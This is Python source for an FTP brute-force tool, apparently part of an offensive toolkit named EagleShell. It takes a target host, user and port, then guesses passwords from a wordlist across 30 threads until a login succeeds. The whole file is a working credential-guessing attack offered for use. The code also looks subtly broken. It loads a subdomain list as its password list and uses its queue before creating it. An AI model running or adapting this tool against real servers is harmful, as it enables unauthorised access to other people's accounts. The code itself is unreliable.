#!/usr/bin/python3

# BruteFTP - FTP Brute Force Script

# Imports all needed variables and packages
from assets.banners import bruteftp_banner
from assets.designs import *
from assets.properties import clear_screen
from assets.redirect import redirect_eagleshell_brute_force
from assets.redirect import redirect_eagleshell_menu
import os
import ftplib
from threading import Thread
import queue


# Main function
def bruteftp_main():
    global q
    global password_found
    global password_tried
    with q.mutex:
        q.queue.clear()
        q.all_tasks_done.notify_all()
        q.unfinished_tasks = 0
    password_found = ''
    password_tried = 0
    # initialize the queue
    q = queue.Queue()
    # number of threads to spawn
    n_threads = 30

    # Function that takes some user input
    def configuration():
        try:
            global host_set
            global user_set
            global port_set
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(bruteftp_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            print('')
            # hostname or IP address of the FTP server
            print('\tHost Input')
            print('\tExample: 10.10.10.15')
            print('')
            # username of the FTP server, root as default for linux
            print('\tUser Input:')
            print('\tExample: admin')
            print('')
            # port of FTP, aka 21
            print('\tPort Input')
            print('\tExample: 21')
            print('')
            print('\tZ): Back')
            print('\tX): Exit')
            print('')
            while True:
                host_set = input('\u001b[33mHOST \u001b[37m> ').lower()
                if host_set == 'z':
                    redirect_eagleshell_brute_force()
                elif host_set == 'x':
                    exit_shell()
                user_set = input('\u001b[33mUSER \u001b[37m> ').lower()
                if user_set == 'z':
                    redirect_eagleshell_brute_force()
                elif user_set == 'x':
                    exit_shell()
                port_set = input('\u001b[33mPORT \u001b[37m> ').lower()
                if port_set == 'z':
                    redirect_eagleshell_brute_force()
                elif port_set == 'x':
                    exit_shell()
                process()
        except KeyboardInterrupt:
            exit_shell()

    # Function that displays before bruteforce
    def process():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(bruteftp_banner)
            print(line)
            print('')
            print(author)
            print('Process:')
            print('')
            print('\tStatus')
            print('\t------')
            print('')
            print('\tStop: CTRL+C')
            print('')
            brute_forcing()
            result()
        except KeyboardInterrupt:
            exit_shell()

    # Function that connects to FTP
    def connect_ftp():
        try:
            global q
            global password_found
            global password_tried
            while True:
                # get the password from the queue
                password = q.get()
                # initialize the FTP server object
                server = ftplib.FTP()
                print('\tTRYING PASSWORD: ' + str(password), end='\r')
                password_tried = password_tried + 1
                try:
                    # tries to connect to FTP server with a timeout of 5
                    server.connect(host_set, int(port_set), timeout=5)
                    # login using the credentials (user & password)
                    server.login(user_set, password)
                except ftplib.error_perm:
                    # login failed, wrong credentials
                    pass
                else:
                    # correct credentials
                    password_found = password
                    # we found the password, let's clear the queue
                    with q.mutex:
                        q.queue.clear()
                        q.all_tasks_done.notify_all()
                        q.unfinished_tasks = 0
                finally:
                    # notify the queue that the task is completed for this password
                    q.task_done()
        except KeyboardInterrupt:
            pass

    # Function that does the brute force
    def brute_forcing():
        try:
            # read the wordlist of passwords
            passwords = open("/opt/EagleShell/wordlists/subdomains/subdomains-10000.txt").read().split("\n")

            # put all passwords to the queue
            for password in passwords:
                q.put(password)

            # create `n_threads` that runs that function
            for t in range(n_threads):
                thread = Thread(target=connect_ftp)
                # will end when the main thread end
                thread.daemon = True
                thread.start()
            # wait for the queue to be empty
            q.join()
        except KeyboardInterrupt:
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
            result()

    def result():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(bruteftp_banner)
            print(line)
            print('')
            print(author)
            print('Result:')
            print('')
            if len(password_found) > 1:
                print('\tPASSWORD: \u001b[32;1m' + password_found + '\u001b[37m')
            else:
                print('\t\u001b[37mPASSWORD: \u001b[31mNot Found.\u001b[37m')
            print('')
            if len(password_found) > 1:
                print('\tPASSWORDS TRIED: \u001b[32;1m' + str(password_tried) + '\u001b[37m')
            else:
                print('\tPASSWORDS TRIED: \u001b[31m' + str(password_tried) + '\u001b[37m')
            print('')
            print('\tY): New')
            print('\tZ): Menu')
            print('\tX): Exit')
            print('')
            while True:
                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
                if eagleshell_cmd == 'y':
                    bruteftp_main()
                elif eagleshell_cmd == 'z':
                    redirect_eagleshell_menu()
                elif eagleshell_cmd == 'x':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    # The function where you exit
    def exit_shell():
        from assets.functions import exit_main
        exit_main()

    configuration()


bruteftp_main()
